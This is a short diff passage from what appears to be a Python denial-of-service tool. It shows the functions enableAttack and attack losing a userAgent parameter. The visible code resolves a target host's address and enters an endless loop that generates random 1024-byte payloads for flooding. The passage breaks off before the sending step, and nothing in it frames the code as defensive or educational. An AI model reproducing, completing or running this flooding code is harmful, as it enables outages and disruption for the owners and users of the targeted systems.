@@ -5,11 +5,11 @@ import socket
 import time
 import random
 
-def enableAttack(ip, port, threadsCount, cooldown, userAgent):
+def enableAttack(ip, port, threadsCount, cooldown):
     parsingResults = urlparse(ip)
     ipAdd = socket.gethostbyname(parsingResults.path)
 
-    def attack(ip=ip, port=port, cooldown=cooldown, userAgent=userAgent):
+    def attack(ip=ip, port=port, cooldown=cooldown):
         while True:
             try:
                 data = random._urandom(1024)
